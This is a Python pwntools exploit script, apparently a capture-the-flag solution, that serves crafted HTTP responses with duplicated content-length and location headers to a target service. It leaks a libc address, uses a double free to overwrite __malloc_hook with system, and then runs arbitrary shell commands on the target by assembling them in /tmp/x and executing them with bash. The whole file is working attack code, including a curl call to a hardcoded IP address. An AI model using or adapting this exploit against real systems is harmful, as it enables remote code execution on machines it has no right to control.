from pwn import *
import os
import threading
import sys
cmd = raw_input("cmd>")

host = "0.0.0.0"

libc = ELF("./libc-2.27.so")
srv = server(port=6969,bindaddr=host,typ='tcp')
def exp(cmd,srv):
        log.info("send req desu")
        os.system("curl -X POST http://13.231.207.73:9009/ --data 'url=http://hax.perfect.blue:6969/a' &")
        l = srv.next_connection()



        response         = ""
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 20"         + "\r\n"
        response        += "content-length: 10000"      + "\r\n"
        response        += "location: /bighack_deet"+ "\r\n"
        response        += "content-length: 100"        + "\r\n"
        response        += "location: /"                        + "\r\n"
        response        += "\r\n"

        l.clean()
        l.send(response)
        #l.recvline()
        l.close()
        l = srv.next_connection()
        l.recv(numb=5)
        leek = u64(("\x00"+l.recv(5)).ljust(8,'\x00'))
        log.success("leak-> "+hex(leek))
        libc_base = leek - 0x3ebc00
        malloc_hook_ptr = libc_base + libc.symbols["__malloc_hook"]
        system_ptr    = libc_base + libc.symbols["system"]
        log.success("libc   @ "+hex(libc_base))
        log.success("system @ "+hex(system_ptr))
        log.success("hook   @ "+hex(malloc_hook_ptr))

        #double free
        response         = ""
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "location: /" + "A"*0x40     + "\r\n"
        response        += "location: /" + "B"*0x40     + "\r\n"
        response        += "location: /" + "C"*0x40     + "\r\n"
        response        += "\r\n"

        l.send(response)
        l.close()
        l = srv.next_connection()
        l.clean()
        response         = ""
        response        += "location: /" +p64(((malloc_hook_ptr-0x200)&0xFFFFFFFFFFFFFF00)>>8)+ "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "location: /"+cmd + "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "location: /" + "A"*0x40     + "\r\n"
        response        += "location: /" + "B"*0x40     + "\r\n"
        response        += "location: /" + "C"*0x40     + "\r\n"
        response        += "\r\n"
        l.send(response)
        l.close()
        l = srv.next_connection()
        l.clean()
        response         = ""
        response        += "location: /" +p64(((malloc_hook_ptr)&0xFFFFFFFFFFFFFF00)>>8)+ "\r\n"
        response        += "content-length: "+ str(0x6) + "\r\n"
        response        += "location: /" + p64(system_ptr) + "\r\n"
        response        += "content-length: "+ str(malloc_hook_ptr-0x201) + "\r\n"
        #response       += "\r\n"

        l.send(response)
        l.close()

#exp(cmd,srv)
#returnsss
exp('rm /tmp/x',srv)
cmd = cmd.rstrip()
for i in range(0, len(cmd), 3):
    exp("echo -n '{}'>>/tmp/x".format(cmd[i:i+3]),srv)

exp('bash /tmp/x',srv)
